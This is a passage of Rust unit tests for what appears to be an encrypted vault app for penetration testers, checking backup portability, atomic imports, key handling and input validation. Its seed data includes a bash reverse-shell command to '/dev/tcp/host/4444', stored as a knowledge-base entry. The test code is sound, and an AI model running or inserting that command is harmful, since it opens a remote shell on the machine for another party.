            assert_eq!(conn.query_row("SELECT entry_type FROM journal_entries LIMIT 1", [], |r| r.get::<_,String>(0)).unwrap(), "recon");
            assert_eq!(conn.query_row("SELECT category FROM kb_entries LIMIT 1", [], |r| r.get::<_,String>(0)).unwrap(), "exploitation");
        }

        std::fs::remove_file(&path).ok();
    }

    // ===== Backup portability and atomicity =====

    /// Create a vault with the standard schema and a known, freshly wrapped DEK.
    fn create_test_vault(path: &Path, password: &str) -> [u8; 32] {
        let conn = vault::init_db(path).unwrap();
        journal::init_journal_tables(&conn).unwrap();
        kb::init_kb_tables(&conn).unwrap();
        activity::init_activity_table(&conn).unwrap();
        conn.execute_batch("PRAGMA foreign_keys = ON;").unwrap();

        let dek = vault::generate_dek();
        let mut salt = [0u8; 32];
        crate::util::fill_random(&mut salt);
        let salt_b64 = base64::engine::general_purpose::STANDARD.encode(salt);
        let mut wrapping_key = vault::derive_key(password, &salt).unwrap();
        let wrapped = vault::wrap_dek(&dek, &wrapping_key).unwrap();
        wrapping_key.zeroize();
        let pass_hash = vault::hash_password(password).unwrap();
        conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('encrypted_dek', ?1)", rusqlite::params![wrapped]).unwrap();
        conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('password_hash', ?1)", rusqlite::params![pass_hash]).unwrap();
        conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('kdf_salt', ?1)", rusqlite::params![salt_b64]).unwrap();
        conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('schema_version', '2')", []).unwrap();
        dek
    }

    /// Seed one fully populated credential plus a project, entry and KB row.
    fn seed_vault(conn: &Connection, dek: &[u8; 32]) {
        let enc = |v: &str| vault::encrypt(dek, v).unwrap();
        conn.execute(
            "INSERT INTO credentials (id, service, username, password_encrypted, url, notes, totp_secret) VALUES (?1,?2,?3,?4,?5,?6,?7)",
            rusqlite::params!["c1", "github.com", enc("dev@example.com"), enc("gh_p@$$w0rd"), enc("https://github.com"), enc("personal account"), enc("JBSWY3DPEHPK3PXP")],
        ).unwrap();
        conn.execute(
            "INSERT INTO credentials (id, service, username, password_encrypted, url, notes) VALUES (?1,?2,?3,?4,?5,?6)",
            rusqlite::params!["c2", "aws", enc("root@corp.io"), enc("short12chars"), enc("https://aws.amazon.com"), enc("prod")],
        ).unwrap();
        conn.execute(
            "INSERT INTO projects (id, name, description, target, methodology) VALUES (?1,?2,?3,?4,?5)",
            rusqlite::params!["p1", "Home Lab", enc("passive recon"), enc("192.168.1.0/24"), enc("OSSTMM")],
        ).unwrap();
        conn.execute(
            "INSERT INTO journal_entries (id, project_id, title, content, entry_type, severity) VALUES (?1,?2,?3,?4,?5,?6)",
            rusqlite::params!["e1", "p1", enc("found open port"), enc("port 22 open"), "recon", "medium"],
        ).unwrap();
        conn.execute(
            "INSERT INTO kb_entries (id, title, command, description, tags, category) VALUES (?1,?2,?3,?4,?5,?6)",
            rusqlite::params!["k1", enc("reverse shell"), enc("bash -i >& /dev/tcp/host/4444 0>&1"), enc("standard shell"), enc("shell,bash"), "exploitation"],
        ).unwrap();
    }

    #[test]
    fn test_backup_roundtrip_across_vaults() {
        // Regression test for the portability bug: a backup made by one vault
        // must restore into a vault with a different master password, with every
        // field still readable. Previously only the password was decrypted on
        // export, so every other field stayed encrypted under the source key.
        let dir = migration_test_dir("backup-roundtrip");
        let source = dir.join("source.db");
        let destination = dir.join("destination.db");

        let source_dek = create_test_vault(&source, "source-password-123");
        {
            let conn = Connection::open(&source).unwrap();
            seed_vault(&conn, &source_dek);

            let backup = backup::collect_all(&conn, &source_dek).unwrap();
            assert_eq!(backup.version, "1.1");
            // Flatten through JSON exactly as the real export path does.
            let json = serde_json::to_string(&backup).unwrap();
            std::fs::write(dir.join("backup.json"), json).unwrap();
        }

        let destination_dek = create_test_vault(&destination, "destination-password-456");
        {
            let json = std::fs::read_to_string(dir.join("backup.json")).unwrap();
            let backup: backup::VaultBackup = serde_json::from_str(&json).unwrap();
            let prepared = backup::prepare_for_import(backup, &destination_dek).unwrap();

            let conn = Connection::open(&destination).unwrap();
            conn.execute_batch("PRAGMA foreign_keys = ON;").unwrap();
            backup::restore_all(&conn, &prepared).unwrap();
        }

        // Reopen and confirm every field decrypts with the DESTINATION key.
        {
            let conn = Connection::open(&destination).unwrap();
            let dec = |v: &str| vault::decrypt(&destination_dek, v).unwrap();

            let count: i64 = conn.query_row("SELECT COUNT(*) FROM credentials", [], |r| r.get(0)).unwrap();
            assert_eq!(count, 2, "both credentials must import");

            let username: String = conn.query_row("SELECT username FROM credentials WHERE service='github.com'", [], |r| r.get(0)).unwrap();
            assert_eq!(dec(&username), "dev@example.com");
            let password: String = conn.query_row("SELECT password_encrypted FROM credentials WHERE service='github.com'", [], |r| r.get(0)).unwrap();
            assert_eq!(dec(&password), "gh_p@$$w0rd");
            let url: String = conn.query_row("SELECT url FROM credentials WHERE service='github.com'", [], |r| r.get(0)).unwrap();
            assert_eq!(dec(&url), "https://github.com");
            let notes: String = conn.query_row("SELECT notes FROM credentials WHERE service='github.com'", [], |r| r.get(0)).unwrap();
            assert_eq!(dec(&notes), "personal account");
            let totp: String = conn.query_row("SELECT totp_secret FROM credentials WHERE service='github.com'", [], |r| r.get(0)).unwrap();
            assert_eq!(dec(&totp), "JBSWY3DPEHPK3PXP");

            // The short password specifically exercises the Base64-padding class
            // of bug that used to break certain ciphertext lengths.
            let short_pw: String = conn.query_row("SELECT password_encrypted FROM credentials WHERE service='aws'", [], |r| r.get(0)).unwrap();
            assert_eq!(dec(&short_pw), "short12chars");

            let description: String = conn.query_row("SELECT description FROM projects WHERE name='Home Lab'", [], |r| r.get(0)).unwrap();
            assert_eq!(dec(&description), "passive recon");
            let target: String = conn.query_row("SELECT target FROM projects LIMIT 1", [], |r| r.get(0)).unwrap();
            assert_eq!(dec(&target), "192.168.1.0/24");

            let (title, content): (String, String) = conn.query_row("SELECT title, content FROM journal_entries LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?))).unwrap();
            assert_eq!(dec(&title), "found open port");
            assert_eq!(dec(&content), "port 22 open");

            let (kb_title, kb_command, kb_desc, kb_tags): (String, String, String, String) =
                conn.query_row("SELECT title, command, description, tags FROM kb_entries LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?))).unwrap();
            assert_eq!(dec(&kb_title), "reverse shell");
            assert_eq!(dec(&kb_command), "bash -i >& /dev/tcp/host/4444 0>&1");
            assert_eq!(dec(&kb_desc), "standard shell");
            assert_eq!(dec(&kb_tags), "shell,bash");

            // Proof that re-encryption really happened: the source key must not
            // be able to read anything the destination now stores.
            assert!(vault::decrypt(&source_dek, &username).is_err(), "source key must not read imported credentials");
            assert!(vault::decrypt(&source_dek, &title).is_err(), "source key must not read imported journal data");
            assert!(vault::decrypt(&source_dek, &kb_title).is_err(), "source key must not read imported commands");
        }

        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_backup_import_is_atomic_on_failure() {
        let dir = migration_test_dir("backup-atomic");
        let source = dir.join("source.db");
        let destination = dir.join("destination.db");

        let source_dek = create_test_vault(&source, "source-password-123");
        let backup = {
            let conn = Connection::open(&source).unwrap();
            seed_vault(&conn, &source_dek);
            backup::collect_all(&conn, &source_dek).unwrap()
        };

        let destination_dek = create_test_vault(&destination, "destination-password-456");
        {
            let conn = Connection::open(&destination).unwrap();
            // Fail the LAST table restore_all touches, after credentials,
            // projects and journal entries have already been inserted.
            conn.execute_batch(
                "CREATE TRIGGER fail_kb_insert BEFORE INSERT ON kb_entries
                 BEGIN SELECT RAISE(ABORT, 'injected failure'); END;",
            ).unwrap();

            let prepared = backup::prepare_for_import(backup, &destination_dek).unwrap();
            let result = backup::restore_all(&conn, &prepared);
            assert!(result.is_err(), "import must fail when a later insert fails");

            let credentials: i64 = conn.query_row("SELECT COUNT(*) FROM credentials", [], |r| r.get(0)).unwrap();
            assert_eq!(credentials, 0, "a failed import must leave no partial data behind");
            let projects: i64 = conn.query_row("SELECT COUNT(*) FROM projects", [], |r| r.get(0)).unwrap();
            assert_eq!(projects, 0, "projects must roll back too");
            let entries: i64 = conn.query_row("SELECT COUNT(*) FROM journal_entries", [], |r| r.get(0)).unwrap();
            assert_eq!(entries, 0, "journal entries must roll back too");
        }

        std::fs::remove_dir_all(dir).unwrap();
    }

    fn legacy_v1_backup(source_dek: &[u8; 32]) -> backup::VaultBackup {
        backup::VaultBackup {
            version: "1.0".into(),
            credentials: vec![backup::BackupCredential {
                service: "github.com".into(),
                // A v1.0 export left these as the source vault's ciphertext.
                username: vault::encrypt(source_dek, "dev@example.com").unwrap(),
                password: "plaintext-password".into(),
                url: vault::encrypt(source_dek, "https://github.com").unwrap(),
                notes: vault::encrypt(source_dek, "note").unwrap(),
                totp_secret: None,
                created_at: "2026-01-01".into(),
            }],
            projects: vec![],
            journal_entries: vec![],
            kb_entries: vec![],
        }
    }

    #[test]
    fn test_backup_legacy_payload_is_handled_by_vault_ownership() {
        let source_dek = vault::generate_dek();
        let other_dek = vault::generate_dek();

        // Same vault: the fields really are ciphertext for this key, so the
        // legacy payload still imports rather than being refused.
        assert!(
            backup::prepare_for_import(legacy_v1_backup(&source_dek), &source_dek).is_ok(),
            "a same-vault legacy backup must still be importable"
        );

        // Foreign vault: refuse loudly instead of writing unreadable bytes.
        let error = backup::prepare_for_import(legacy_v1_backup(&source_dek), &other_dek).unwrap_err();
        assert!(error.contains("different vault"), "got: {error}");

        // Unknown future versions are refused rather than guessed at.
        let mut future = legacy_v1_backup(&source_dek);
        future.version = "9.9".into();
        let error = backup::prepare_for_import(future, &source_dek).unwrap_err();
        assert!(error.contains("unsupported backup version"), "got: {error}");
    }

    #[test]
    fn test_backup_prepare_creates_missing_project() {
        let dir = migration_test_dir("backup-missing-project");
        let destination = dir.join("destination.db");
        let dek = create_test_vault(&destination, "destination-password-456");

        let payload = backup::VaultBackup {
            version: "1.1".into(),
            credentials: vec![],
            projects: vec![],
            journal_entries: vec![backup::BackupJournalEntry {
                project_name: "Ghost Engagement".into(),
                title: "orphan entry".into(),
                content: "content".into(),
                entry_type: "note".into(),
                severity: "info".into(),
                created_at: "2026-01-01".into(),
            }],
            kb_entries: vec![],
        };

        let prepared = backup::prepare_for_import(payload, &dek).unwrap();
        let conn = Connection::open(&destination).unwrap();
        conn.execute_batch("PRAGMA foreign_keys = ON;").unwrap();
        // Would violate the foreign key if the project were not created first.
        backup::restore_all(&conn, &prepared).unwrap();

        let projects: i64 = conn.query_row("SELECT COUNT(*) FROM projects", [], |r| r.get(0)).unwrap();
        assert_eq!(projects, 1, "the missing project must be created");
        let joined: String = conn.query_row(
            "SELECT p.name FROM journal_entries j JOIN projects p ON j.project_id = p.id",
            [], |r| r.get(0),
        ).unwrap();
        assert_eq!(joined, "Ghost Engagement");

        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_bulk_entry_insert_is_atomic_on_failure() {
        // Saving a parsed scan writes many entries at once. One bad row must not
        // leave the engagement holding a subset of the hosts.
        let dir = migration_test_dir("bulk-entries-atomic");
        let path = dir.join("vault.db");
        let dek = create_test_vault(&path, "destination-password-456");

        let conn = Connection::open(&path).unwrap();
        conn.execute_batch("PRAGMA foreign_keys = ON;").unwrap();
        conn.execute("INSERT INTO projects (id, name) VALUES ('p1', 'Engagement')", []).unwrap();

        let good = journal::EntryInput {
            project_id: "p1".into(),
            title: "host a".into(),
            content: "22/tcp open".into(),
            entry_type: "recon".into(),
            severity: "info".into(),
        };
        let bad = journal::EntryInput {
            project_id: "does-not-exist".into(),
            title: "host b".into(),
            content: "80/tcp open".into(),
            entry_type: "recon".into(),
            severity: "info".into(),
        };

        let result = insert_entries(&conn, &dek, &[good, bad]);
        assert!(result.is_err(), "a foreign key violation must fail the whole batch");

        let count: i64 = conn.query_row("SELECT COUNT(*) FROM journal_entries", [], |r| r.get(0)).unwrap();
        assert_eq!(count, 0, "no entry may be written when the batch fails");

        std::fs::remove_dir_all(dir).unwrap();
    }

    // ===== Crypto robustness and validation =====

    #[test]
    fn test_unwrap_dek_rejects_wrong_length_instead_of_panicking() {
        use aes_gcm::aead::{Aead, KeyInit};
        use aes_gcm::{Aes256Gcm, Nonce};

        let wrapping_key = [7u8; 32];
        let cipher = Aes256Gcm::new_from_slice(&wrapping_key).unwrap();
        let mut nonce_bytes = [0u8; 12];
        crate::util::fill_random(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);
        // A 1-byte payload is authentic under the key but is not a 32-byte DEK.
        let ciphertext = cipher.encrypt(nonce, b"x".as_ref()).unwrap();
        let mut combined = nonce_bytes.to_vec();
        combined.extend_from_slice(&ciphertext);
        let encoded = base64::engine::general_purpose::STANDARD.encode(&combined);

        let result = vault::unwrap_dek(&encoded, &wrapping_key);
        let message = result.expect_err("a short wrapped payload must be an error, not a panic");
        assert!(message.contains("corrupted DEK"), "got: {message}");
    }

    #[test]
    fn test_input_validation_rejects_weak_and_oversized_values() {
        assert!(reject_empty_password("", "Password").is_err());
        assert!(require_min_length("too-short", "Password", MIN_MASTER_PASSWORD_CHARS).is_err());
        assert!(require_min_length("long-enough-password", "Password", MIN_MASTER_PASSWORD_CHARS).is_ok());

        let blank_service = CredentialInput {
            service: "   ".into(), username: String::new(), password: String::new(),
            url: String::new(), notes: String::new(),
        };
        assert!(validate_credential(&blank_service).is_err(), "blank service must be rejected");

        let oversized = CredentialInput {
            service: "a".repeat(MAX_FIELD_CHARS + 1), username: String::new(),
            password: String::new(), url: String::new(), notes: String::new(),
        };
        assert!(validate_credential(&oversized).is_err(), "oversized field must be rejected");

        let valid = CredentialInput {
            service: "github.com".into(), username: "user".into(), password: "pw".into(),
            url: String::new(), notes: String::new(),
        };
        assert!(validate_credential(&valid).is_ok());
    }

    #[test]
    fn test_totp_secret_validation() {
        assert!(totp::validate_secret("").is_err(), "empty secret must be rejected");
        assert!(totp::validate_secret("JBSWY3").is_err(), "a short secret must be rejected");
        assert!(totp::validate_secret("JBSWY3DPEHPK3PXP").is_ok(), "a 16-char base32 secret (80 bits) is acceptable");
        assert!(totp::validate_secret("JBSWY3DPEHPK3PX").is_err(), "a 15-char secret is below the 80-bit floor");
        assert!(totp::validate_secret("JBSWY3DPEHPK3PXP@").is_err(), "invalid characters must be rejected");
        assert!(totp::generate_code("").is_err(), "an empty secret must not produce a code");
    }

    #[test]
    fn test_activity_ids_do_not_collide() {
        let conn = Connection::open_in_memory().unwrap();
        activity::init_activity_table(&conn).unwrap();
        for i in 0..500 {
            activity::log_action(&conn, "test", &format!("entry {i}"));
        }
        let total: i64 = conn.query_row("SELECT COUNT(*) FROM activity_log", [], |r| r.get(0)).unwrap();
        assert_eq!(total, 500, "every audit entry must survive");
    }

    fn sha256_hash(input: &str) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(input.as_bytes());
        format!("{:x}", hasher.finalize())
    }
}
